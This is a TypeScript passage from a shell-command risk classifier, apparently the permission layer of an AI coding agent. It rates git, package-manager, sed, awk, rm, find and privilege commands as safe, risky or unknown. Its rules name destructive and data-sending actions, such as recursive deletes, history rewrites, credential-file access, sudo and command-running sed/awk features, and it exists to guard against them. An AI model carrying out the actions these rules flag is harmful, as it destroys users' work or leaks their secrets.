const GSD_UNCHECKED_VERBS = new Set(['worktree', 'websearch', 'package-legitimacy', 'restore-custom-files', 'graphify', 'loop']);

/**
 * The managed Open-GSD runtime's gsd-tools (`gsd-tools <verb> …` or `gsd-tools query <verb>.<sub> …`):
 * it reads and updates .planning/ and commits inside the workspace. Verbs that push, publish, or
 * work on another repository are risky; ones that reach the network or outside the workspace are
 * not decided here; every path it is given must be inside the workspace or the runtime.
 */
function classifyGsdTools(args: Word[], state: SegmentState, context: CommandContext): CommandClassification {
  const words = args.map((arg) => arg.text);
  for (const [at, word] of words.entries()) {
    const option = /^--(cwd|project-dir|config-dir)(?:=(.*))?$/.exec(word);
    if (!option) continue;
    if (option[1] === 'config-dir') return unknown('gsd-tools --config-dir works on another configuration folder');
    const value = option[2] ?? words[at + 1];
    if (!value || !pathFacts(value, state.cwd, context).inside) return unknown(`gsd-tools --${option[1]} points outside the workspace`);
  }
  const positional = words.filter((word) => !looksLikeOption(word));
  const command = positional[0] === 'query' ? positional[1] ?? '' : positional[0] ?? '';
  const verb = command.split('.')[0];
  const label = `gsd-tools ${positional[0] === 'query' ? 'query ' : ''}${command}`.trim();
  if (GSD_RISKY_VERBS.has(verb) || [...positional.slice(0, 3), ...command.split('.')].some((word) => RELEASE_NAME.test(word))) return risky(`${label} pushes, publishes, or changes another repository`, publishTo(GSD_RISKY_VERBS.has(verb) ? 'git-remote' : 'release'));
  if (GSD_UNCHECKED_VERBS.has(verb)) return unknown(`${label} can reach the network or folders outside the workspace`);
  const reads = checkReads(args, state, context, label, true);
  return reads.verdict === 'safe' ? safe(`${label} runs Open-GSD's own tool from the runtime NEAR AI installed`) : reads;
}

/** Checks the targets of a command that writes files: outside the workspace, credentials, or protected folders are risky. */
function checkWrites(args: Word[], state: SegmentState, context: CommandContext, label: string): CommandClassification {
  // Every protected target is tagged, also the ones after the argument that decides the verdict.
  noteEffects(protectedWriteEffects(args, state, context));
  for (const arg of args) {
    if (looksLikeOption(arg.text)) continue;
    const facts = pathFacts(arg.text, state.cwd, context);
    if (facts.sensitive) return risky(`${label} touches ${arg.text}, which may hold credentials or knowledge-base keys`);
    if (!facts.inside && !facts.device) return risky(`${label} writes ${arg.text}, which is outside the workspace`);
    if (facts.protectedWrite) return risky(`${label} writes ${arg.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`);
  }
  return safe(`${label} only changes files inside the workspace`);
}

/** The paths `git restore` discards changes in: its operands, without the value of `-s`/`--source`. */
function restorePaths(rest: readonly Word[]): Word[] {
  const out: Word[] = [];
  for (let index = 0; index < rest.length; index += 1) {
    const text = rest[index].text;
    if (text === '--') { out.push(...rest.slice(index + 1)); break; }
    if (text === '-s' || text === '--source') { index += 1; continue; }
    if (looksLikeOption(text)) continue;
    out.push(rest[index]);
  }
  return out;
}

function classifyGit(args: Word[], state: SegmentState, context: CommandContext): CommandClassification {
  let index = 0;
  while (index < args.length && args[index].text === '--no-pager') index += 1;
  if (index < args.length && looksLikeOption(args[index].text)) return unknown('git options before the subcommand (-C, -c, --git-dir) change what it acts on');
  const sub = args[index]?.text ?? '';
  const rest = args.slice(index + 1);
  const words = rest.map((arg) => arg.text);
  const has = (...flags: string[]) => words.some((word) => flags.includes(word) || flags.some((flag) => flag.startsWith('--') && word.startsWith(`${flag}=`)));
  const shortFlag = (letters: string) => words.some((word) => /^-[A-Za-z]+$/.test(word) && [...letters].some((letter) => word.includes(letter)));
  const label = `git ${sub}`;
  const writesOrEscapes = words.find((word) => /^--(?:output|no-index|ext-diff|exec|upload-pack|receive-pack|git-dir|work-tree)(?:=|$)|^-o$/.test(word));
  switch (sub) {
    case 'push': return risky('git push changes a remote repository', publishTo('git-remote'));
    case 'send-email': return risky('git send-email sends data off this machine', [{ verb: 'send', channel: 'email' }]);
    case 'rebase': case 'filter-branch': case 'filter-repo': case 'replace': return risky(`${label} rewrites history`, DESTROY_ALL);
    case 'reset': return has('--hard', '--merge', '--keep') ? risky('git reset --hard discards uncommitted changes', DESTROY_ALL) : unknown('git reset moves the branch or unstages changes');
    case 'clean': {
      if (words.length && words.every((word) => word === '-n' || word === '--dry-run' || !looksLikeOption(word)) && has('-n', '--dry-run')) return unknown('git clean --dry-run');
      // The paths it is limited to, unless an exclude pattern makes its operands something else.
      const operands = has('-e', '--exclude') ? [] : rest.filter((arg) => arg.text !== '--' && !looksLikeOption(arg.text));
      return risky('git clean deletes untracked files', destroyPaths(operands.map((arg) => effectPath(arg, state, context))));
    }
    case 'checkout':
      if (words.includes('--') || words.includes('.') || has('-f', '--force', '-B', '--ours', '--theirs', '-p', '--patch')) {
        // D-45: discarding uncommitted work is destruction. Only the paths after `--` are surely paths; anything else is the whole tree.
        const dash = rest.findIndex((arg) => arg.text === '--');
        const named = dash < 0 ? [] : rest.slice(dash + 1).filter((arg) => !looksLikeOption(arg.text));
        return risky('git checkout over files discards their uncommitted changes', destroyPaths(named.map((arg) => effectPath(arg, state, context))));
      }
      if (words[0] === '-b' && words.length === 2 && !looksLikeOption(words[1])) return safe('git checkout -b creates a new branch');
      return unknown('git checkout may overwrite uncommitted changes');
    case 'switch':
      if (has('-C', '--force-create', '-f', '--force', '--discard-changes')) return risky('git switch with force discards changes or resets a branch', DESTROY_ALL);
      if ((words[0] === '-c' || words[0] === '--create') && words.length === 2 && !looksLikeOption(words[1])) return safe('git switch -c creates a new branch');
      // Without --force, git refuses to switch over uncommitted changes it would lose.
      if (words.length === 1 && !looksLikeOption(words[0])) return safe('git switch changes branch and keeps uncommitted changes');
      return unknown('git switch changes the checked-out branch');
    case 'restore':
      if ((has('--staged') || shortFlag('S')) && !has('--worktree') && !shortFlag('W')) return safe('git restore --staged only unstages changes');
      return risky('git restore discards uncommitted changes', destroyPaths(restorePaths(rest).map((arg) => effectPath(arg, state, context))));
    case 'fetch': case 'pull': {
      // Named remotes only: a URL on the command line could carry data out.
      if (words.some((word) => !looksLikeOption(word) && /:\/\/|^[\w.-]+@[\w.-]+:|^\/|^\.\.?\//.test(word))) return unknown(`${label} from a URL or path instead of a named remote`);
      if (writesOrEscapes || has('--force', '-f', '--rebase', '-r', '--prune', '-p', '--prune-tags', '--refmap', '--recurse-submodules')) return unknown(`${label} with options that can rewrite or remove local work`);
      return safe(sub === 'fetch' ? 'git fetch downloads from a named remote and changes no local work' : 'git pull merges from a named remote; git stops before overwriting uncommitted changes');
    }
    case 'merge':
      if (has('--abort', '--continue', '--quit')) return safe(`git merge ${words[0]} finishes or undoes a merge in progress`);
      if (writesOrEscapes || has('-s', '--strategy', '-X', '--strategy-option', '--allow-unrelated-histories', '--squash')) return unknown('git merge with a strategy option');
      return words.length && words.every((word) => !looksLikeOption(word) || ['--no-ff', '--ff-only', '--ff', '--no-edit', '--no-commit'].includes(word) || /^-m$/.test(word)) ? safe('git merge records a merge commit, which can be undone') : unknown('git merge');
    case 'revert': case 'cherry-pick':
      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
      return safe(`${label} records a new commit locally`);
    case 'mv': case 'rm': {
      if (has('-f', '--force') || shortFlag('f')) return unknown(`${label} --force can lose uncommitted changes`);
      const operands = rest.filter((arg) => !looksLikeOption(arg.text) && arg.text !== '--');
      const writes = checkWrites(operands, state, context, label);
      return writes.verdict === 'safe' ? safe(`${label} changes tracked files inside the workspace, which git can restore`) : writes;
    }
    case 'branch':
      if (has('-d', '-D', '--delete', '-f', '--force', '-m', '-M', '--move', '-c', '-C', '--copy', '--set-upstream-to', '-u', '--unset-upstream', '--edit-description') || shortFlag('dDmMcCfu')) {
        // Deleting a branch or forcing one over another is destruction; a plain rename, copy or upstream change is not.
        const destroys = has('-d', '-D', '--delete', '-f', '--force') || shortFlag('dDfMC');
        return risky('git branch deletes, moves, or force-updates a branch', destroys ? DESTROY_ALL : undefined);
      }
      if (words.every((word) => ['-a', '-r', '-v', '-vv', '--list', '--show-current', '--all', '--remotes', '--merged', '--no-merged', '--verbose'].includes(word))) return safe('git branch lists branches');
      return unknown('git branch with arguments');
    case 'tag':
      if (has('-d', '--delete', '-f', '--force') || shortFlag('df')) return risky('git tag deletes or moves a tag', DESTROY_ALL);
      return words.every((word) => ['-l', '--list', '-n'].includes(word)) ? safe('git tag lists tags') : unknown('git tag creates a tag');
    case 'stash':
      if (words[0] === 'drop' || words[0] === 'clear') return risky('git stash drop or clear deletes stashed work', DESTROY_ALL);
      if (words[0] === 'list' || words[0] === 'show') return safe(`git stash ${words[0]} only reads`);
      if (!words.length || (['push', 'save', 'pop', 'apply'].includes(words[0]) && words.slice(1).every((word) => ['-m', '--message', '-u', '--include-untracked', '--index', '-q'].includes(word) || !looksLikeOption(word)))) return safe('git stash sets changes aside or brings them back, keeping them recoverable');
      return unknown('git stash changes the working tree');
    case 'remote':
      if (!words.length || (words.length === 1 && (words[0] === '-v' || words[0] === '--verbose'))) return safe('git remote lists remotes');
      if (['add', 'remove', 'rm', 'set-url', 'rename', 'prune', 'set-head', 'set-branches'].includes(words[0])) return risky('git remote changes where this repository pushes and fetches');
      return unknown('git remote');
    case 'config':
      if (has('--global', '--system')) return risky('git config --global changes git settings outside this workspace');
      return unknown('git config changes or prints repository settings');
    case 'reflog': return words[0] === 'expire' || words[0] === 'delete' ? risky('git reflog expire or delete destroys recovery points', DESTROY_ALL) : safe('git reflog only reads');
    case 'gc': case 'prune': return risky(`${label} can permanently remove unreachable commits`, DESTROY_ALL);
    case 'update-ref': return risky('git update-ref rewrites references directly', DESTROY_ALL);
    case 'status': case 'diff': case 'log': case 'show': case 'blame': case 'shortlog': case 'describe': case 'rev-parse': case 'ls-files': case 'grep': case 'whatchanged': case 'show-ref': case 'ls-tree': case 'cat-file': case 'merge-base': case 'rev-list':
      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes} can write files or read outside the repository`);
    {
      const reads = checkReads(rest, state, context, label);
      return reads.verdict === 'safe' ? safe(`${label} only reads the repository`) : reads;
    }
    case 'add': {
      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
      const reads = checkReads(rest, state, context, label);
      return reads.verdict === 'safe' ? safe('git add stages changes inside the workspace') : reads;
    }
    case 'commit':
      if (has('--amend')) return unknown('git commit --amend rewrites the last commit', DESTROY_ALL);
      if (has('--no-verify') || shortFlag('n')) return unknown('git commit --no-verify skips the repository\'s hooks');
      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
      return words.some((word) => !looksLikeOption(word) && isSensitivePath(word)) ? risky('git commit names a credential file') : safe('git commit records changes locally');
    default: return unknown(`git ${sub || '(no subcommand)'} is not one the rules know`);
  }
}

function checkScript(name: string, state: SegmentState, context: CommandContext, runner: string, depth: number): CommandClassification {
  const scripts = context.packageScripts ?? {};
  // Every script npm would run is read, even after one has decided the verdict, so what the later ones publish or destroy is still seen.
  let decided: CommandClassification | undefined;
  const mark = effectMark();
  for (const key of [`pre${name}`, name, `post${name}`]) {
    const body = scripts[key];
    if (typeof body !== 'string') continue;
    // A script that runs scripts (or itself) stops at the one bound, inside classifyText, with its effects unknown.
    const inner = classifyText(body, { ...context, cwd: state.cwd }, depth + 1);
    if (inner.verdict === 'risky') decided ??= risky(`${runner} ${name} runs the "${key}" script (${body.length > 120 ? `${body.slice(0, 120)}…` : body}), and ${inner.reason}`, inner.effects);
  }
  // A release-like name is a publish on its own word; when the script body already says where it publishes, that is the tag.
  const publishes = effectsSince(mark).some((effect) => effect.verb === 'publish' || effect.verb === 'send');
  if (RELEASE_NAME.test(name)) return risky(`${runner} ${name} looks like a publish, release, or deploy script`, publishes ? undefined : publishTo('release'));
  return decided ?? safe(`${runner} ${name} runs a project script`);
}

function classifyPackageManager(manager: string, args: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
  const words = args.map((arg) => arg.text);
  if (words.some((word) => /^--(?:prefix|global|location|userconfig|globalconfig|registry)(?:=|$)/.test(word) || word === '-g')) return unknown(`${manager} with --prefix, --global, or a registry option acts outside the workspace`);
  const first = words.findIndex((word) => !looksLikeOption(word));
  const sub = first >= 0 ? words[first] : '';
  const extra = first >= 0 ? args.slice(first + 1) : [];
  if (words.slice(first, first + 2).some((word) => word === 'publish' || word === 'unpublish')) return risky(`${manager} ${words.slice(first, first + 2).join(' ')} publishes a package`, publishTo('registry'));
  if (['publish', 'unpublish', 'deprecate', 'dist-tag', 'owner', 'adduser', 'login', 'logout', 'token', 'access', 'team', 'org', 'star', 'hook', 'npm-publish'].includes(sub)) return risky(`${manager} ${sub} changes a package registry or your account`, publishTo('registry'));
  if (sub === 'config' || sub === 'set') return risky(`${manager} ${sub} changes package-manager settings outside the workspace`);
  if (sub === 'version' && extra.length) return unknown(`${manager} version changes the version and may tag a release`);
  // Installing exactly what the lockfile declares (no package names); adding packages goes to the safety model.
  const installs = sub === 'ci' || sub === 'install' || sub === 'i' || (manager === 'yarn' && !sub);
  if (installs && words.every((word) => word === sub || LOCKFILE_INSTALL_OPTIONS.test(word))) return safe(`${manager} ${sub || 'install'} installs what the project's lockfile already lists`);
  const extraCheck = checkReads(extra.filter((arg) => arg.text !== '--'), state, context, `${manager} ${sub}`);
  if (extraCheck.verdict !== 'safe') return extraCheck;
  if (['test', 't', 'tst'].includes(sub)) return checkScript('test', state, context, manager, depth);
  if (['run', 'run-script', 'rum', 'urn'].includes(sub)) {
    const script = extra.find((arg) => !looksLikeOption(arg.text));
    if (!script) return safe(`${manager} run lists the project scripts`);
    return checkScript(script.text, state, context, `${manager} run`, depth);
  }
  if (['build', 'lint', 'typecheck', 'check', 'start'].includes(sub) && manager !== 'npm') return checkScript(sub, state, context, manager, depth);
  if (manager === 'yarn' && sub && !['add', 'install', 'remove', 'upgrade', 'up', 'dlx', 'exec', 'create', 'init', 'link', 'unlink', 'global', 'cache', 'set', 'plugin', 'npm', 'pack', 'workspace', 'workspaces'].includes(sub)) return checkScript(sub, state, context, manager, depth);
  if (['ls', 'list', 'outdated', 'view', 'info', 'why', 'explain', 'help', '--version', '-v'].includes(sub) || (!sub && words.some((word) => word === '--version' || word === '-v'))) return unknown(`${manager} ${sub} may contact the registry`);
  return unknown(`${manager} ${sub || ''} can install or run code the rules cannot check`.replace(/\s+/g, ' '));
}

function classifyNpx(args: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
  const index = args.findIndex((arg) => !looksLikeOption(arg.text));
  if (index < 0) return unknown('npx without a tool');
  if (args.slice(0, index).some((arg) => !['--no-install', '--no', '-q', '--quiet'].includes(arg.text))) return unknown('npx options can install packages');
  const tool = args[index].text;
  const rest = args.slice(index + 1);
  if (tool === 'vsce' || tool === '@vscode/vsce' || tool === 'ovsx') return rest[0]?.text === 'publish' || rest[0]?.text === 'unpublish' ? risky(`npx ${tool} publish publishes an extension`, publishTo('registry')) : unknown(`npx ${tool}`);
  if (/^(?:semantic-release|np|release-it|changeset|lerna|gh-pages|vercel|netlify|firebase|wrangler|serverless|sls|cdk)$/.test(tool) || RELEASE_NAME.test(rest.map((arg) => arg.text).join(' '))) return risky(`npx ${tool} can publish, release, or deploy`, publishTo(PUBLISH_TOOL_TARGETS[tool] ?? 'release'));
  if (!DEV_TOOLS.has(tool)) return unknown(`npx ${tool} may download and run a package`);
  return classifyWords([{ text: tool, quoted: false, glob: false, expansion: false }, ...rest], state, context, depth + 1, true);
}

/** A tool in the workspace's own node_modules/.bin, run by path. */
function isLocalBin(program: string, state: SegmentState, context: CommandContext): boolean {
  if (!program.includes('/')) return false;
  const facts = pathFacts(program, state.cwd, context);
  return facts.inside && path.basename(path.dirname(facts.absolute)) === '.bin' && path.basename(path.dirname(path.dirname(facts.absolute))) === 'node_modules';
}

/** One sed address: a line number, `$`, or a /regex/. */
const SED_ADDRESS = String.raw`(?:\d+|\$|/(?:[^/\\\n]|\\.)*/I?)`;
/**
 * sed scripts made only of printing, deleting, quitting, and s///: no `e` (runs commands), `w`
 * or `W` (writes files), `r` or `R` (reads files), and no s flags that do those.
 */
const SED_SCRIPT = new RegExp(String.raw`^\s*(?:(?:${SED_ADDRESS}(?:\s*,\s*(?:${SED_ADDRESS}|\+\d+))?\s*!?\s*)?(?:[pdqQ=nNPDgGhHxl]|s([^\\\n\w\s])(?:(?!\1)[^\\\n]|\\.)*\1(?:(?!\1)[^\\\n]|\\.)*\1[gpiImM0-9]*)\s*(?:[;\n]\s*|$))+$`);

function classifySed(args: Word[], state: SegmentState, context: CommandContext): CommandClassification {
  const scripts: string[] = [];
  const files: Word[] = [];
  let inPlace = false;
  for (let index = 0; index < args.length; index += 1) {
    const text = args[index].text;
    if (text === '-e' || text === '--expression') { scripts.push(args[index + 1]?.text ?? ''); index += 1; continue; }
    if (text.startsWith('--expression=')) { scripts.push(text.slice(13)); continue; }
    if (/^-i(?:\.[\w.~-]+)?$|^--in-place(?:=[\w.~-]+)?$/.test(text)) { inPlace = true; continue; }
    if (/^-[nErszu]+$|^--(?:quiet|silent|regexp-extended|separate|null-data|unbuffered|posix|debug|sandbox)$/.test(text)) continue;
    if (looksLikeOption(text)) return unknown(`sed ${text} is an option the rules do not check`);
    if (!scripts.length && !args.slice(0, index).some((arg) => arg.text === '-e' || arg.text === '--expression' || arg.text.startsWith('--expression='))) { scripts.push(text); continue; }
    files.push(args[index]);
  }
  if (!scripts.length || scripts.some((script) => !SED_SCRIPT.test(script))) return unknown('sed with a script that may run commands or write other files');
  if (!inPlace) return checkReads(files, state, context, 'sed', true);
  if (!files.length) return unknown('sed -i without a file');
  if (files.some((file) => file.glob || file.expansion)) return unknown('sed -i edits files matched at run time');
  const writes = checkWrites(files, state, context, 'sed -i');
  return writes.verdict === 'safe' ? safe('sed -i edits files inside the workspace') : writes;
}

/** awk programs that can run commands, write or read other files, or read the environment. */
const AWK_UNSAFE = /system\s*\(|getline|\||\bprintf?\b[^;}\n]*>|ENVIRON|PROCINFO|@load|@include|close\s*\(|fflush/;

function classifyAwk(args: Word[], state: SegmentState, context: CommandContext): CommandClassification {
  let program: string | undefined;
  const files: Word[] = [];
  for (let index = 0; index < args.length; index += 1) {
    const text = args[index].text;
    if (text === '-F' || text === '-v') { if (text === '-v' && !/^[A-Za-z_]\w*=/.test(args[index + 1]?.text ?? '')) return unknown('awk -v without an assignment'); index += 1; continue; }
    if (/^-F.+|^-v[A-Za-z_]\w*=/.test(text)) continue;
    if (looksLikeOption(text)) return unknown(`awk ${text} is an option the rules do not check`);
    if (program === undefined) { program = text; continue; }
    files.push(args[index]);
  }
  if (program === undefined || AWK_UNSAFE.test(program)) return unknown('awk with a program that may run commands or write files');
  return checkReads(files.filter((file) => !/^[A-Za-z_]\w*=/.test(file.text)), state, context, 'awk', true);
}

/** Classifies one simple command (no operators). */
function classifyWords(words: Word[], state: SegmentState, context: CommandContext, depth: number, viaNpx = false): CommandClassification {
  const deep = tooDeep(depth);
  if (deep) return deep;
  if (!words.length) return safe('nothing to run');
  // `{ git push; }`, `then git push`, `exec git push`: the words after are a command too, read here for what they do.
  if (RUNS_WHAT_FOLLOWS.has(words[0].text) && !(words[0].quoted && words[0].text !== '{')) {
    const following = words.slice(1);
    if (following.at(-1)?.text === '}') following.pop();
    if (following.length) classifyWords(following, state, context, depth + 1);
  }
  let index = 0;
  let prefixReason: string | undefined;
  // Environment prefixes: FOO=bar cmd.
  while (index < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index].text)) {
    const name = words[index].text.slice(0, words[index].text.indexOf('='));
    if (!HARMLESS_ENV.has(name)) prefixReason = prefixReason ?? `it sets ${name}, which can change what the command runs`;
    index += 1;
  }
  if (index >= words.length) return unknown('it sets shell variables for the rest of the session');
  let program = words[index].text;
  let args = words.slice(index + 1);
  // Wrappers that run the next command as is.
  while (program === 'time' || program === 'env' || program === 'timeout' || program === 'nice' || program === 'nohup' || program === 'command') {
    if (program === 'env') {
      let next = 0;
      while (next < args.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(args[next].text)) { const name = args[next].text.split('=')[0]; if (!HARMLESS_ENV.has(name)) prefixReason = prefixReason ?? `it sets ${name}`; next += 1; }
      if (next < args.length && looksLikeOption(args[next].text)) return unknown('env with options');
      if (next >= args.length) return unknown('env prints environment variables, which may include secrets');
      args = args.slice(next);
    } else if (program === 'timeout') {
      if (!args[0] || !/^\d+(?:\.\d+)?[smhd]?$/.test(args[0].text)) return unknown('timeout with options');
      args = args.slice(1);
    } else if (program !== 'time') {
      prefixReason = prefixReason ?? `${program} changes how the command runs`;
    }
    if (!args.length) return unknown(`${program} alone`);
    program = args[0].text;
    args = args.slice(1);
  }
  const name = programName(program);
  const result = classifyProgram(name, program, args, state, context, depth, viaNpx);
  if (result.verdict === 'safe' && prefixReason) return unknown(prefixReason);
  return result;
}

/**
 * What a delete destroys, for its effect tag (D-17). A recursive delete is destruction unless every target is a temporary folder or build output the
 * classifier already lets go; a plain delete is destruction only outside the workspace and its scratch folders. Either is a protected write when it removes
 * something in .git, .planning/.near-ai or .near-ai. No target, no tag.
 */
function deleteEffects(name: string, targets: readonly Word[], args: readonly Word[], state: SegmentState, context: CommandContext): CommandEffect[] {
  if (!targets.length) return [];
  const root = path.resolve(context.root);
  const facts = (arg: Word): PathFacts => pathFacts(arg.text, state.cwd, context);
  // Inside a temporary folder (never the folder itself), and holding neither the project nor the home folder. A temporary folder that is `/` or holds the
  // home folder (a TMPDIR set that way) counts for nothing.
  const home = context.home ? path.resolve(context.home) : undefined;
  const temporary = temporaryCandidates(context).filter((candidate) => candidate !== path.parse(candidate).root && !(home !== undefined && isInside(candidate, home)));
  const temporaryPath = (absolute: string): boolean =>
    temporary.some((folder) => absolute !== folder && isInside(folder, absolute)) && !isInside(absolute, root) && !(home !== undefined && isInside(absolute, home));
  const recursive = name === 'rm' && args.some((arg) => /^-(?:[A-Za-z]*[rR][A-Za-z]*)$|^--recursive$/.test(arg.text));
  if (recursive) {
    if (targets.every((arg) => !arg.glob && !arg.expansion && temporaryPath(facts(arg).absolute))) return [];
    const regenerable = targets.every((arg) => {
      const found = facts(arg);
      return !arg.glob && !arg.expansion && found.inside && found.absolute !== root && !found.protectedWrite && BUILD_OUTPUT.has(path.basename(found.absolute));
    });
    if (regenerable) return [];
    return destroyPaths(targets.map((arg) => (arg.glob && !isWorkspaceGlob(arg, state, context) ? '**' : effectPath(arg, state, context))));
  }
  const outside = targets.some((arg) => {
    if (arg.expansion) return false;
    const found = facts(arg);
    return !found.inside && !found.device && !found.scratch && !temporaryPath(found.absolute);
  });
  return [...(outside ? DESTROY_ALL : []), ...protectedWriteEffects(targets, state, context)];
}

/** What `sudo`, `doas`, `pkexec` or `su -c` would run, read for its effects; the privilege itself is already risky. */
function noteRunsAs(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, depth: number): void {
  if (name === 'su') {
    const at = args.findIndex((arg) => arg.text === '-c' || arg.text === '--command');
    const script = at < 0 ? undefined : args[at + 1];
    if (script !== undefined && !script.expansion) classifyText(script.text, { ...context, cwd: state.cwd }, depth + 1);
    return;
  }
  let index = 0;
  while (index < args.length && looksLikeOption(args[index].text)) index += PRIVILEGE_VALUE_OPTIONS.has(args[index].text) ? 2 : 1;
  if (args[index]?.text === '--') index += 1;
  const inner = args.slice(index);
  if (inner.length) classifyWords([...inner], state, context, depth + 1);
}

/** The script `bash -c '…'` (or `sh -c`, `bash -lc`, …) or `eval …` runs, read for its effects. The verdict stays the rules' own: such code is not checked. */
function noteInlineScript(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, depth: number): void {
  if (name === 'eval') {
    const text = args.map((arg) => arg.text).join(' ');
    if (text.trim()) classifyText(text, { ...context, cwd: state.cwd }, depth + 1);
    return;
  }
  if (!SHELLS.has(name)) return;
  const at = args.findIndex((arg) => /^-[A-Za-z]*c[A-Za-z]*$/.test(arg.text));
  if (at < 0) return;
  let index = at + 1;
  while (index < args.length && (looksLikeOption(args[index].text) || args[index].text === '--')) index += 1;
  const script = args[index];
  if (script !== undefined && !script.expansion) classifyText(script.text, { ...context, cwd: state.cwd }, depth + 1);
}

/** The protected places a segment's redirects write, tagged whatever else decides the segment (D-44). */
function noteRedirectWrites(redirects: readonly Redirect[], state: SegmentState, context: CommandContext): void {
  const targets = redirects
    .filter((redirect) => redirect.op !== '<' && redirect.op !== '<<' && redirect.op !== '<<<' && !(redirect.op.endsWith('&') && redirect.target && /^[0-9-]+$/.test(redirect.target.text)))
    .flatMap((redirect) => (redirect.target === undefined || redirect.target.glob ? [] : [redirect.target]));
  noteEffects(protectedWriteEffects(targets, state, context));
}

function classifyProgram(name: string, program: string, args: Word[], state: SegmentState, context: CommandContext, depth: number, viaNpx: boolean): CommandClassification {
  const words = args.map((arg) => arg.text);
  const flags = words.filter(looksLikeOption);
  const anyFlag = (pattern: RegExp) => flags.some((flag) => pattern.test(flag));
  // `gsd_run` as a trusted Open-GSD preamble just defined it: the managed gsd-tools.
  if (program === 'gsd_run' && context.gsdRunDefined) return classifyGsdTools(args, state, context);
  // The managed Open-GSD runtime's own launcher, named by its absolute path.
  if (program.includes('/') && isTrustedGsdTool({ text: program, quoted: false, glob: false, expansion: false }, state, context)) return classifyGsdTools(args, state, context);
  // Risky whatever the path.
  if (PRIVILEGE.has(name)) {
    noteRunsAs(name, args, state, context, depth);
    return risky(`${name} runs a command with elevated privileges`);
  }
  if (POWER.has(name)) return risky(`${name} stops or restarts the machine`);
  if (DISK_DESTROYERS.has(name) || /^mkfs(?:\.|$)/.test(name)) return risky(`${name} can destroy file or disk contents beyond recovery`, DESTROY_ALL);
  if (NETWORK_SENDERS.has(name)) return risky(`${name} can send data off this machine`);
  if (name === 'rm' || name === 'rmdir' || name === 'unlink') {
    const targets = args.filter((arg) => !looksLikeOption(arg.text) && arg.text !== '--');
    noteEffects(deleteEffects(name, targets, args, state, context));
    const sensitive = targets.find((arg) => pathFacts(arg.text, state.cwd, context).sensitive);
    if (sensitive) return risky(`${name} deletes ${sensitive.text}, which may hold credentials or knowledge-base keys`);
    if (name === 'rm' && anyFlag(/^-(?:[A-Za-z]*[rR][A-Za-z]*)$|^--recursive$/)) {
      const temporary = targets.length > 0 && targets.every((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return !arg.glob && /^\/tmp\/[^/]+/.test(facts.absolute) && !facts.absolute.split('/').includes('..'); });
      if (temporary) return unknown('rm -r of a temporary path');
      if (!targets.length || targets.some((arg) => arg.glob || arg.expansion || !pathFacts(arg.text, state.cwd, context).inside)) return risky('rm -r deletes folders beyond recovery, outside the workspace or decided at run time');
      if (targets.some((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.protectedWrite || facts.absolute === path.resolve(context.root); })) return risky('rm -r deletes the whole workspace, .git, .planning/.near-ai or .near-ai');
      // Folders a build or install regenerates (dist, node_modules, …) can go; anything else inside the workspace goes to the safety model.
      const regenerable = targets.every((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.absolute !== path.resolve(context.root) && !facts.protectedWrite && BUILD_OUTPUT.has(path.basename(facts.absolute)); });
      return regenerable ? safe('rm -r only deletes build output inside the workspace, which a build or install recreates') : unknown('rm -r deletes folders inside the workspace');
    }
    if (!targets.length) return unknown(`${name} without a file`);
    const outside = targets.find((arg) => !pathFacts(arg.text, state.cwd, context).inside);
    if (outside) return risky(`${name} deletes ${outside.text}, outside the workspace`);
    if (targets.some((arg) => arg.glob || arg.expansion)) return unknown(`${name} deletes files matched at run time`);
    const guarded = targets.find((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.protectedWrite || facts.absolute === path.resolve(context.root); });
    if (guarded) return risky(`${name} deletes ${guarded.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`);
    return safe(`${name} deletes ${targets.length === 1 ? 'a file' : 'files'} inside the workspace`);
  }
  if (name === 'find') {
    if (words.includes('-delete')) return risky('find -delete deletes files', DESTROY_ALL);
    const execAt = words.findIndex((word) => ['-exec', '-execdir', '-ok', '-okdir'].includes(word));
    if (execAt >= 0) {
      const innerWords = args.slice(execAt + 1).filter((arg) => arg.text !== ';' && arg.text !== '+' && arg.text !== '{}');
      if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) return risky(`find -exec ${innerWords[0].text} deletes every match`, DESTROY_ALL);
      const inner = classifyWords(innerWords, state, context, depth + 1);
      return inner.verdict === 'risky' ? risky(`find -exec runs a command for every match, and ${inner.reason}`) : unknown('find -exec runs a command for every match');
    }
    if (words.some((word) => /^-f(?:print|print0|printf|ls)$/.test(word))) return unknown('find writes its results to a file');
    // The first arguments up to the first expression are the paths searched.
    // The paths searched and any file an expression names (-newer, -samefile) must be inside the workspace.
    const reads = checkReads(args, state, context, 'find', true);
    if (reads.verdict !== 'safe') return reads;
    const named = args.find((arg) => !looksLikeOption(arg.text) && (KB_OR_SECRET.test(arg.text) || SENSITIVE_TEXT.test(arg.text)));
    return named ? risky(`find looks for ${named.text}, which may hold credentials`) : safe('find only lists files inside the workspace');
  }
  if (name === 'chmod' || name === 'chown' || name === 'chgrp' || name === 'chattr') {
    // The first operand is the mode or owner; the rest are paths.
    const paths = args.filter((arg) => !looksLikeOption(arg.text)).slice(1);
    const outside = paths.find((arg) => !pathFacts(arg.text, state.cwd, context).inside);
    if (outside) return risky(`${name} changes permissions on ${outside.text}, outside the workspace`);
    const sensitive = paths.find((arg) => pathFacts(arg.text, state.cwd, context).sensitive);
    if (sensitive) return risky(`${name} changes permissions on ${sensitive.text}, which may hold credentials`);
    return unknown(`${name} changes file permissions`);
  }
  if (name === 'kill' || name === 'pkill' || name === 'killall' || name === 'skill') {
    if (name !== 'kill') return risky(`${name} kills processes by name`);
    return words.some((word) => word === '-1' || word === '0' || word === '-0') ? risky('kill -1 or kill 0 kills every process it can') : unknown('kill stops a process');
  }
